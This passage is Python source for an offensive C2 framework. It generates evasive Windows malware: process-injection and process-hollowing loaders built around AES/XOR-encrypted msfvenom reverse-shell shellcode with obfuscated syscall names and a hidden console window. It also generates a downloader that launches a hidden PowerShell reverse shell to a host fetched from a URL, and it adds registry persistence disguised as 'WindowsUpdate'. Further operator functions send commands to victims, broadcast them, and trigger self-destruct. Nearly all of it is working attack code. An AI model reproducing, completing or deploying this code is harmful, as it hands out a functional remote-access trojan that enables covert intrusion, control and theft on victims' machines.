    if (!CryptSetKeyParam(hKey, KP_IV, aes_iv, 0)) {{
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return 0;
    }}
    
    DWORD dwMode = CRYPT_MODE_CBC;
    if (!CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&dwMode, 0)) {{
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return 0;
    }}
    
    BYTE* encrypted_data = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, encrypted_size);
    if (!encrypted_data) {{
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return 0;
    }}
    
    memcpy(encrypted_data, encrypted_buf, encrypted_size);
    DWORD data_len = encrypted_size;
    
    if (!CryptDecrypt(hKey, 0, TRUE, 0, encrypted_data, &data_len)) {{
        HeapFree(GetProcessHeap(), 0, encrypted_data);
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return 0;
    }}
    
    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
    
    for (DWORD i = 0; i < data_len; i++) {{
        encrypted_data[i] ^= 0xAA;
    }}
    
    *decrypted_size = data_len;
    
    LPVOID shellcode = VirtualAlloc(0, data_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!shellcode) {{
        HeapFree(GetProcessHeap(), 0, encrypted_data);
        return 0;
    }}
    
    memcpy(shellcode, encrypted_data, data_len);
    
    SecureZeroMemory(encrypted_data, encrypted_size);
    HeapFree(GetProcessHeap(), 0, encrypted_data);
    SecureZeroMemory(aes_key, sizeof(aes_key));
    SecureZeroMemory(aes_iv, sizeof(aes_iv));
    
    return shellcode;
}}

DWORD FindTargetProcess() {{
    DWORD pids[4096];
    DWORD cbNeeded;
    
    if (!EnumProcesses(pids, sizeof(pids), &cbNeeded)) {{
        return 0;
    }}
    
    DWORD processCount = cbNeeded / sizeof(DWORD);
    std::vector<DWORD> candidates;
    
    for (DWORD i = 0; i < processCount; i++) {{
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pids[i]);
        if (hProcess) {{
            char processName[MAX_PATH] = {{0}};
            if (GetModuleBaseNameA(hProcess, 0, processName, MAX_PATH)) {{
                if (_stricmp(processName, "{target_process_full}") == 0) {{
                    candidates.push_back(pids[i]);
                }}
            }}
            CloseHandle(hProcess);
        }}
    }}
    
    if (candidates.empty()) return 0;
    
    srand(GetTickCount() ^ GetCurrentProcessId());
    return candidates[rand() % candidates.size()];
}}

BOOL InjectIntoTarget(LPVOID shellcode, SIZE_T size) {{
    DWORD targetPid = FindTargetProcess();
    if (!targetPid) return FALSE;
    
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
    if (!hProcess) return FALSE;
    
    LPVOID remoteMem = 0;
    SIZE_T regionSize = size;
    NTSTATUS status = NtAllocateVirtualMemory(hProcess, &remoteMem, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    if (status != 0 || !remoteMem) {{
        CloseHandle(hProcess);
        return FALSE;
    }}
    
    SIZE_T bytesWritten = 0;
    status = NtWriteVirtualMemory(hProcess, remoteMem, shellcode, size, &bytesWritten);
    
    if (status != 0) {{
        CloseHandle(hProcess);
        return FALSE;
    }}
    
    DWORD oldProtect;
    status = NtProtectVirtualMemory(hProcess, &remoteMem, &regionSize, PAGE_EXECUTE_READ, &oldProtect);
    
    if (status != 0) {{
        CloseHandle(hProcess);
        return FALSE;
    }}
    
    HANDLE hThread = 0;
    status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, 0, hProcess, remoteMem, 0, 0, 0, 0, 0, 0);
    
    if (status != 0) {{
        CloseHandle(hProcess);
        return FALSE;
    }}
    
    if (hThread) CloseHandle(hThread);
    CloseHandle(hProcess);
    
    return TRUE;
}}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {{
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, SW_HIDE);
    PERSISTENCE_PLACEHOLDER
    
    if (!InitializeSyscalls()) {{
        return 1;
    }}
    
    SIZE_T decrypted_size = 0;
    LPVOID shellcode = DecryptShellcode(&decrypted_size);
    if (!shellcode) {{
        return 1;
    }}
    
    InjectIntoTarget(shellcode, decrypted_size);
    
    VirtualFree(shellcode, 0, MEM_RELEASE);
    
    return 0;
}}
'''
        
        persistence_code = '''
    char path[MAX_PATH];
    char regcmd[MAX_PATH + 50];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    snprintf(regcmd, sizeof(regcmd), 
             "reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v WindowsUpdate /t REG_SZ /d \\"%s\\" /f", 
             path);
    system(regcmd);
'''
        
        final_code = injection_template.replace("SHELLCODE_DATA_PLACEHOLDER", shellcode_data)
        if persistence:
            final_code = final_code.replace("PERSISTENCE_PLACEHOLDER", persistence_code)
        else:
            final_code = final_code.replace("PERSISTENCE_PLACEHOLDER", "")
        
        cpp_file = f"{self.c2_directory}/payloads/{exe_name}.cpp"
        with open(cpp_file, 'w') as f:
            f.write(final_code)
        
        print(f"{Fore.GREEN}[+] Process injection payload saved to: {cpp_file}")
        print(f"{Fore.CYAN}[*] Target process: {target_process_full}")
        
        if self.compile_payload(cpp_file, exe_name, "injection"):
            print(f"{Fore.GREEN}[+] Payload ready: {self.c2_directory}/payloads/{exe_name}.exe")
        else:
            print(f"{Fore.YELLOW}[!] Manual compilation required:")
            print(f"    x86_64-w64-mingw32-g++ -o {exe_name}.exe {cpp_file} -lpsapi -m64 -static -O2 -s -Wl,--strip-all")
        
        try:
            os.remove(binary_file)
            os.remove(script_path)
            os.remove(shellcode_output)
        except:
            pass
        
        return cpp_file
    
    def generate_process_hollowing_payload(self, ip, port, target_process, persistence=False):
        """Generate process hollowing payload with custom target process"""
        
        print(f"{Fore.CYAN}[?] Enter executable name (without .exe): {Style.RESET_ALL}", end='')
        exe_name = input().strip()
        if not exe_name:
            exe_name = f"hollow_{target_process}_{ip}_{port}"
        
        target_process_full = self.validate_process_name(target_process)
        
        print(f"{Fore.CYAN}[*] Generating process hollowing payload for {ip}:{port} -> Target: {target_process_full}")
        
        temp_dir = f"{self.c2_directory}/temp"
        os.makedirs(temp_dir, exist_ok=True)
        
        binary_file = f"{temp_dir}/reverse_{ip}_{port}.bin"
        
        print(f"{Fore.CYAN}[*] Generating PE...")
        msfvenom_cmd = [
            "msfvenom",
            "-p", "windows/x64/shell_reverse_tcp",
            f"LHOST={ip}",
            f"LPORT={port}",
            "-f", "raw",
            "-o", binary_file
        ]
        
        try:
            subprocess.run(msfvenom_cmd, check=True, capture_output=True, text=True)
            print(f"{Fore.GREEN}[+] Reverse shell created")
        except subprocess.CalledProcessError as e:
            print(f"{Fore.RED}[-] msfvenom failed: {e.stderr}")
            return None
        except FileNotFoundError:
            print(f"{Fore.RED}[-] msfvenom not found!")
            return None
        
        encryption_script = '''#!/usr/bin/env python3
import os
import sys
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

def generate_encrypted_shellcode(input_file, output_file="shellcode_output.txt"):
    if not os.path.exists(input_file):
        print(f"Error: {input_file} not found!")
        sys.exit(1)
    
    with open(input_file, 'rb') as f:
        shellcode = f.read()
    
    print(f"[*] Original shellcode size: {len(shellcode)} bytes")
    
    xor_key = 0xAA
    xor_encrypted = bytes([b ^ xor_key for b in shellcode])
    
    aes_key_raw = os.urandom(32)
    aes_iv = os.urandom(16)
    
    aes_key_hashed = hashlib.sha256(aes_key_raw).digest()
    
    cipher = AES.new(aes_key_hashed, AES.MODE_CBC, aes_iv)
    aes_encrypted = cipher.encrypt(pad(xor_encrypted, AES.block_size))
    
    print(f"[*] AES encrypted size: {len(aes_encrypted)} bytes")
    
    encode_xor = 0xDE
    encoded_key = bytes([b ^ encode_xor for b in aes_key_raw])
    encoded_iv = bytes([b ^ encode_xor for b in aes_iv])
    
    output = []
    output.append("// AES-256-CBC encrypted shellcode (with XOR layer)")
    output.append("unsigned char encrypted_buf[] = {")
    for i in range(0, len(aes_encrypted), 16):
        chunk = aes_encrypted[i:i+16]
        line = "    " + ", ".join(f"0x{b:02x}" for b in chunk)
        if i + 16 < len(aes_encrypted):
            line += ","
        output.append(line)
    output.append("};")
    output.append(f"const SIZE_T encrypted_size = {len(aes_encrypted)};")
    output.append(f"const SIZE_T original_size = {len(shellcode)};\\n")
    
    output.append("// XOR-encoded AES-256 key (will be SHA-256 hashed by CryptDeriveKey)")
    output.append("unsigned char encoded_aes_key[] = {")
    for i in range(0, 32, 16):
        chunk = encoded_key[i:i+16]
        line = "    " + ", ".join(f"0x{b:02x}" for b in chunk)
        if i + 16 < 32:
            line += ","
        output.append(line)
    output.append("};\\n")
    
    output.append("// XOR-encoded AES IV")
    output.append("unsigned char encoded_aes_iv[] = {")
    for i in range(0, 16, 16):
        chunk = encoded_iv[i:i+16]
        if len(chunk) > 0:
            line = "    " + ", ".join(f"0x{b:02x}" for b in chunk)
            output.append(line)
    output.append("};")
    
    with open(output_file, 'w') as f:
        f.write('\\n'.join(output))
    
    print(f"[+] Output written to: {output_file}")
    
    decoded_key = bytes([b ^ encode_xor for b in encoded_key])
    decoded_iv = bytes([b ^ encode_xor for b in encoded_iv])
    decoded_key_hashed = hashlib.sha256(decoded_key).digest()
    
    decipher = AES.new(decoded_key_hashed, AES.MODE_CBC, decoded_iv)
    decrypted_padded = decipher.decrypt(aes_encrypted)
    
    from Crypto.Util.Padding import unpad
    xor_decrypted = unpad(decrypted_padded, AES.block_size)
    original = bytes([b ^ xor_key for b in xor_decrypted])
    
    if original == shellcode:
        print("[✓] Verification PASSED - encryption/decryption works!")
    else:
        print("[!] Verification FAILED")
    
    return output_file

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 encrypt_final.py <reverse.bin>")
        sys.exit(1)
    
    generate_encrypted_shellcode(sys.argv[1])
'''
        
        script_path = f"{temp_dir}/encrypt.py"
        with open(script_path, 'w') as f:
            f.write(encryption_script)
        
        print(f"{Fore.CYAN}[*] Encrypting shellcode with AES-256...")
        try:
            result = subprocess.run(["python3", script_path, binary_file], cwd=self.c2_directory, capture_output=True, text=True)
            if result.returncode != 0:
                print(f"{Fore.RED}[-] Encryption failed: {result.stderr}")
                return None
            print(result.stdout)
        except Exception as e:
            print(f"{Fore.RED}[-] Encryption error: {e}")
            return None
        
        shellcode_output = f"{self.c2_directory}/shellcode_output.txt"
        if not os.path.exists(shellcode_output):
            print(f"{Fore.RED}[-] Shellcode output not found")
            return None
        
        with open(shellcode_output, 'r') as f:
            shellcode_data = f.read()
        
        hollowing_template = f'''#include <windows.h>
#include <winternl.h>
#include <psapi.h>
#include <cstdio>
#include <cstring>
#include <wincrypt.h>
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")

SHELLCODE_DATA_PLACEHOLDER

typedef NTSTATUS (NTAPI *SYSCALL_1)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
typedef NTSTATUS (NTAPI *SYSCALL_2)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS (NTAPI *SYSCALL_3)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (NTAPI *SYSCALL_4)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS (NTAPI *SYSCALL_5)(HANDLE, PCONTEXT);
typedef NTSTATUS (NTAPI *SYSCALL_6)(HANDLE, PCONTEXT);
typedef NTSTATUS (NTAPI *SYSCALL_7)(HANDLE, PULONG);
typedef NTSTATUS (NTAPI *SYSCALL_8)(HANDLE);
typedef NTSTATUS (NTAPI *SYSCALL_9)(HANDLE, NTSTATUS);

SYSCALL_1 f1 = NULL;
SYSCALL_2 f2 = NULL;
SYSCALL_3 f3 = NULL;
SYSCALL_4 f4 = NULL;
SYSCALL_5 f5 = NULL;
SYSCALL_6 f6 = NULL;
SYSCALL_7 f7 = NULL;
SYSCALL_8 f8 = NULL;
SYSCALL_9 f9 = NULL;

BOOL InitializeSyscalls() {{
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) {{
        ntdll = LoadLibraryW(L"ntdll.dll");
        if (!ntdll) return FALSE;
    }}
    
    char nca1[] = {{78,116,67,114,101,97,116,101,84,104,114,101,97,100,69,120,0}};
    char nca2[] = {{78,116,87,114,105,116,101,86,105,114,116,117,97,108,77,101,109,111,114,121,0}};
    char nca3[] = {{78,116,65,108,108,111,99,97,116,101,86,105,114,116,117,97,108,77,101,109,111,114,121,0}};
    char nca4[] = {{78,116,80,114,111,116,101,99,116,86,105,114,116,117,97,108,77,101,109,111,114,121,0}};
    char nca5[] = {{78,116,71,101,116,67,111,110,116,101,120,116,84,104,114,101,97,100,0}};
    char nca6[] = {{78,116,83,101,116,67,111,110,116,101,120,116,84,104,114,101,97,100,0}};
    char nca7[] = {{78,116,82,101,115,117,109,101,84,104,114,101,97,100,0}};
    char nca8[] = {{78,116,67,108,111,115,101,0}};
    char nca9[] = {{78,116,84,101,114,109,105,110,97,116,101,80,114,111,99,101,115,115,0}};
    
    f1 = (SYSCALL_1)GetProcAddress(ntdll, nca1);
    f2 = (SYSCALL_2)GetProcAddress(ntdll, nca2);
    f3 = (SYSCALL_3)GetProcAddress(ntdll, nca3);
    f4 = (SYSCALL_4)GetProcAddress(ntdll, nca4);
    f5 = (SYSCALL_5)GetProcAddress(ntdll, nca5);
    f6 = (SYSCALL_6)GetProcAddress(ntdll, nca6);
    f7 = (SYSCALL_7)GetProcAddress(ntdll, nca7);
    f8 = (SYSCALL_8)GetProcAddress(ntdll, nca8);
    f9 = (SYSCALL_9)GetProcAddress(ntdll, nca9);
    
    return (f1 && f2 && f3 && f4 && f5 && f6 && f7 && f8 && f9);
}}

LPVOID DecryptShellcode(SIZE_T* decrypted_size) {{
    BYTE aes_key[32];
    BYTE aes_iv[16];
    
    for (int i = 0; i < 32; i++) {{
        aes_key[i] = encoded_aes_key[i] ^ 0xDE;
    }}
    for (int i = 0; i < 16; i++) {{
        aes_iv[i] = encoded_aes_iv[i] ^ 0xDE;
    }}
    
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    HCRYPTKEY hKey = 0;
    
    if (!CryptAcquireContextA(&hProv, 0, MS_ENH_RSA_AES_PROV_A, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {{
        if (!CryptAcquireContextA(&hProv, 0, 0, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {{
            return 0;
        }}
    }}
    
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {{
        CryptReleaseContext(hProv, 0);
        return 0;
    }}
    
    if (!CryptHashData(hHash, aes_key, 32, 0)) {{
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return 0;
    }}
    
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, CRYPT_EXPORTABLE, &hKey)) {{
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return 0;
    }}
    
    if (!CryptSetKeyParam(hKey, KP_IV, aes_iv, 0)) {{
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return 0;
    }}
    
    DWORD dwMode = CRYPT_MODE_CBC;
    if (!CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&dwMode, 0)) {{
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return 0;
    }}
    
    BYTE* encrypted_data = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, encrypted_size);
    if (!encrypted_data) {{
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return 0;
    }}
    
    memcpy(encrypted_data, encrypted_buf, encrypted_size);
    DWORD data_len = encrypted_size;
    
    if (!CryptDecrypt(hKey, 0, TRUE, 0, encrypted_data, &data_len)) {{
        HeapFree(GetProcessHeap(), 0, encrypted_data);
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return 0;
    }}
    
    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
    
    for (DWORD i = 0; i < data_len; i++) {{
        encrypted_data[i] ^= 0xAA;
    }}
    
    *decrypted_size = data_len;
    
    LPVOID shellcode = VirtualAlloc(0, data_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!shellcode) {{
        HeapFree(GetProcessHeap(), 0, encrypted_data);
        return 0;
    }}
    
    memcpy(shellcode, encrypted_data, data_len);
    
    SecureZeroMemory(encrypted_data, encrypted_size);
    HeapFree(GetProcessHeap(), 0, encrypted_data);
    SecureZeroMemory(aes_key, sizeof(aes_key));
    SecureZeroMemory(aes_iv, sizeof(aes_iv));
    
    return shellcode;
}}

BOOL GetTargetPath(char* out, DWORD size) {{
    char sysPath[MAX_PATH];
    if (GetSystemDirectoryA(sysPath, MAX_PATH)) {{
        sprintf_s(out, size, "%s\\\\{target_process_full}", sysPath);
        return TRUE;
    }}
    return FALSE;
}}

BOOL PerformProcessHollowing(LPVOID payload, SIZE_T psize) {{
    STARTUPINFOA si = {{ sizeof(si) }};
    PROCESS_INFORMATION pi = {{ 0 }};
    char target[MAX_PATH];
    
    if (!GetTargetPath(target, MAX_PATH)) return FALSE;
    
    if (!CreateProcessA(target, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
        return FALSE;
    
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    if (f5(pi.hThread, &ctx) != 0) {{
        f9(pi.hProcess, 0);
        f8(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }}
    
    LPVOID remoteMem = NULL;
    SIZE_T regionSize = psize;
    if (f3(pi.hProcess, &remoteMem, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) != 0) {{
        f9(pi.hProcess, 0);
        f8(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }}
    
    SIZE_T written;
    if (f2(pi.hProcess, remoteMem, payload, psize, &written) != 0) {{
        f9(pi.hProcess, 0);
        f8(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }}
    
    DWORD oldProt;
    if (f4(pi.hProcess, &remoteMem, &regionSize, PAGE_EXECUTE_READ, &oldProt) != 0) {{
        f9(pi.hProcess, 0);
        f8(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }}
    
    #ifdef _WIN64
        ctx.Rip = (DWORD64)remoteMem;
    #else
        ctx.Eip = (DWORD)remoteMem;
    #endif
    
    if (f6(pi.hThread, &ctx) != 0) {{
        f9(pi.hProcess, 0);
        f8(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }}
    
    if (f7(pi.hThread, NULL) != 0) {{
        f9(pi.hProcess, 0);
        f8(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }}
    
    f8(pi.hThread);
    CloseHandle(pi.hProcess);
    return TRUE;
}}

void Delay() {{
    for(volatile int i = 0; i < 10000; i++);
}}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR cmdLine, int show) {{
    Delay();
    
    if (!InitializeSyscalls()) return 1;
    
    SIZE_T decrypted_size = 0;
    LPVOID payload = DecryptShellcode(&decrypted_size);
    if (!payload) return 1;
    
    BOOL result = PerformProcessHollowing(payload, decrypted_size);
    
    VirtualFree(payload, 0, MEM_RELEASE);
    
    if (result) {{
        while(1) Sleep(10000);
    }}
    
    return result ? 0 : 1;
}}
'''
        
        persistence_code = '''
    char path[MAX_PATH];
    char regcmd[MAX_PATH + 50];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    snprintf(regcmd, sizeof(regcmd), 
             "reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v WindowsUpdate /t REG_SZ /d \\"%s\\" /f", 
             path);
    system(regcmd);
'''
        
        final_code = hollowing_template.replace("SHELLCODE_DATA_PLACEHOLDER", shellcode_data)
        
        if persistence:
            final_code = final_code.replace("    Delay();\n    \n    if (!InitializeSyscalls())", f"    Delay();{persistence_code}\n    \n    if (!InitializeSyscalls())")
        
        cpp_file = f"{self.c2_directory}/payloads/{exe_name}.cpp"
        with open(cpp_file, 'w') as f:
            f.write(final_code)
        
        print(f"{Fore.GREEN}[+] Process hollowing payload saved to: {cpp_file}")
        print(f"{Fore.CYAN}[*] Target process: {target_process_full}")
        print(f"{Fore.GREEN}[+] AES-256-CBC encrypted shellcode embedded")
        
        if self.compile_payload(cpp_file, exe_name, "hollowing"):
            print(f"{Fore.GREEN}[+] Payload ready: {self.c2_directory}/payloads/{exe_name}.exe")
            print(f"{Fore.GREEN}[+] Process hollowing payload will spawn and inject into {target_process_full}")
        else:
            print(f"{Fore.YELLOW}[!] Manual compilation required:")
            print(f"    x86_64-w64-mingw32-g++ -o {exe_name}.exe {cpp_file} -lpsapi -m64 -static -O2 -s -Wl,--strip-all -Wno-write-strings -ffunction-sections -fdata-sections")
        
        try:
            os.remove(binary_file)
            os.remove(script_path)
            os.remove(shellcode_output)
        except:
            pass
        
        return cpp_file
    
    def generate_payload_with_download(self, ip, port, download_url, persistence=False):
        """Generate payload that downloads IP from a URL"""
        
        print(f"{Fore.CYAN}[?] Enter executable name (without .exe): {Style.RESET_ALL}", end='')
        exe_name = input().strip()
        if not exe_name:
            exe_name = f"download_{ip}_{port}"
        
        c_code = f'''#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#pragma comment(lib, "wininet.lib")

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {{
    char realTarget[256] = {{0}};
    char ip[64] = {{0}};
    char port[8] = {{0}};
    char cmd[2048];
    
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, SW_HIDE);
    
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (hInternet) {{
        HINTERNET hConnect = InternetOpenUrlA(hInternet, "{download_url}", NULL, 0, INTERNET_FLAG_RELOAD, 0);
        if (hConnect) {{
            DWORD bytesRead;
            if (InternetReadFile(hConnect, realTarget, sizeof(realTarget)-1, &bytesRead) && bytesRead > 0) {{
                realTarget[bytesRead] = '\\0';
                
                char* colonPos = strchr(realTarget, ':');
                if (colonPos) {{
                    int ipLen = colonPos - realTarget;
                    strncpy(ip, realTarget, ipLen);
                    ip[ipLen] = '\\0';
                    strcpy(port, colonPos + 1);
                    
                    snprintf(cmd, sizeof(cmd),
                        "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \\""
                        "$c=New-Object Net.Sockets.TCPClient('%s',%s);"
                        "$s=$c.GetStream();[byte[]]$b=0..65535|%%{{0}};"
                        "while(($r=$s.Read($b,0,$b.Length))-ne0){{"
                        "$d=([Text.Encoding]::ASCII).GetString($b,0,$r);"
                        "$e=(iex $d 2>&1|Out-String);"
                        "$t=([text.encoding]::ASCII).GetBytes($e);"
                        "$s.Write($t,0,$t.Length);$s.Flush()"
                        "}};$c.Close()\\"",
                        ip, port);
                    
                    CreateProcess(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                }}
            }}
            InternetCloseHandle(hConnect);
        }}
        InternetCloseHandle(hInternet);
    }}
    
    return 0;
}}'''
        
        if persistence:
            persistence_code = '''
    char path[MAX_PATH];
    char regcmd[MAX_PATH + 50];
    GetModuleFileName(NULL, path, MAX_PATH);
    snprintf(regcmd, sizeof(regcmd), 
             "reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v WindowsUpdate /t REG_SZ /d \\"%s\\" /f", 
             path);
    system(regcmd);
'''
            c_code = c_code.replace('    HWND stealth;', persistence_code + '\n    HWND stealth;')
        
        payload_file = f"{self.c2_directory}/payloads/{exe_name}.c"
        with open(payload_file, 'w') as f:
            f.write(c_code)
        
        print(f"{Fore.GREEN}[+] Payload with download saved to: {payload_file}")
        print(f"{Fore.YELLOW}[!] Manual compilation required:")
        print(f"    x86_64-w64-mingw32-gcc {payload_file} -o {exe_name}.exe -lwininet -lws2_32 -static -s")
        
        return payload_file
    
    def list_targets(self):
        if not self.targets:
            print(f"{Fore.YELLOW}[!] No active targets")
            return
        
        print(f"\n{Fore.CYAN}{'ID':<15} {'Address':<20} {'Port':<10} {'Last Seen':<25} {'OS Info'}")
        print(f"{'-'*80}")
        for tid, info in self.targets.items():
            print(f"{tid:<15} {info['address'][0]:<20} {info['port']:<10} "
                  f"{info['last_seen'].strftime('%Y-%m-%d %H:%M:%S'):<25} "
                  f"{info['os_info'][:30] if info['os_info'] else 'Unknown'}")
        print()
    
    def send_command(self, target_id, command):
        if target_id not in self.targets:
            print(f"{Fore.RED}[-] Target {target_id} not found")
            return
        
        if command.lower() == 'self_destroy':
            self.self_destroy(target_id)
        elif command.lower() == 'zombie_mode':
            self.zombie_mode(target_id)
        elif command.lower() == 'add_persistence':
            self.add_persistence(target_id)
        else:
            self.targets[target_id]['command_queue'].put(command)
            print(f"{Fore.GREEN}[+] Command sent to {target_id}")
    
    def self_destroy(self, target_id):
        destroy_cmd = """
        $path = (Get-Process -Id $pid).Path;
        $killscript = @'
        while($true){
            try{
                Stop-Process -Name (Get-Process -Id $pid).ProcessName -Force;
                Remove-Item -Path $path -Force -ErrorAction SilentlyContinue;
                break;
            }
            catch{}
            Start-Sleep 1
        }
        '@;
        Start-Job -ScriptBlock ([scriptblock]::Create($killscript));
        exit
        """
        encoded = base64.b64encode(destroy_cmd.encode()).decode()
        self.targets[target_id]['command_queue'].put(f"powershell -EncodedCommand {encoded}")
        print(f"{Fore.RED}[!] Self-destruct command sent to {target_id}")
    
    def zombie_mode(self, target_id):
        zombie_cmd = """
        Write-Host "[+] Attempting to hide process..."
        $proc = Get-Process -Id $pid
        $proc.StartInfo.WindowStyle = 'Hidden'
        """
        self.targets[target_id]['command_queue'].put(f"powershell -Command \"{zombie_cmd}\"")
        print(f"{Fore.MAGENTA}[*] Zombie mode enabled on {target_id}")
    
    def add_persistence(self, target_id):
        persistence_cmd = """
        $path = (Get-Process -Id $pid).Path;
        $regpath = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
        Set-ItemProperty -Path $regpath -Name "WindowsUpdate" -Value $path;
        Write-Host "[+] Persistence added to registry"
        """
        self.targets[target_id]['command_queue'].put(f"powershell -Command \"{persistence_cmd}\"")
        print(f"{Fore.GREEN}[+] Persistence added on {target_id}")
    
    def broadcast_command(self, command):
        if not self.targets:
            print(f"{Fore.YELLOW}[!] No active targets")
            return
        
        for tid in self.targets:
            self.send_command(tid, command)
        print(f"{Fore.GREEN}[+] Command broadcast to all {len(self.targets)} targets")
    
    def interactive_shell(self, target_id):
        if target_id not in self.targets:
            print(f"{Fore.RED}[-] Target {target_id} not found")
            return

        self.active_interactive = target_id
    
        print(f"{Fore.GREEN}[*] Entering interactive shell for {target_id}")
        print(f"{Fore.YELLOW}[!] Type 'exit' to return to main console{Style.RESET_ALL}")

        while True:
            try:
                cmd = input(f"{Fore.CYAN}{target_id}> {Style.RESET_ALL}")
                if cmd.lower() == 'exit':
                    break
                elif cmd.lower() == 'self_destroy':
                    self.self_destroy(target_id)
                    break
                elif cmd.lower().startswith('ghost'):
                    parts = cmd.split()
                    if len(parts) == 2:
                        self.ghost_command(target_id, parts[1])
                    else:
                        print(f"{Fore.YELLOW}[!] Usage: ghost <IP>")
                elif cmd.strip():
                    self.targets[target_id]['command_queue'].put(cmd)
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[!] Use 'exit' to leave interactive mode")
            except Exception as e:
                print(f"{Fore.RED}Error: {e}")
    
        self.active_interactive = None
    
    def stop_listener(self, port):
        listener_id = f"listener_{port}"
        if listener_id in self.listeners:
            self.listeners[listener_id]['active'] = False
            self.listeners[listener_id]['socket'].close()
            print(f"{Fore.YELLOW}[!] Listener on port {port} stopped")
            return True
        print(f"{Fore.RED}[-] No listener found on port {port}")
        return False
    
    def cleanup(self):
        print(f"{Fore.YELLOW}[!] Cleaning up...")
        for listener in self.listeners.values():
            listener['active'] = False
            try:
                listener['socket'].close()
            except:
                pass
        
        for target in self.targets.values():
            try:
                target['connection'].close()
            except:
                pass
        
        print(f"{Fore.GREEN}[+] Cleanup complete")
    
    def show_help(self):
        help_text = f"""
{Fore.CYAN}C2 Framework - Command Reference{Style.RESET_ALL}
{'='*50}

{Fore.GREEN}Listener Management:{Style.RESET_ALL}
  listen <port>              - Start a new listener on specified port
  listeners                  - List all active listeners
  stop <port>                - Stop listener on specified port

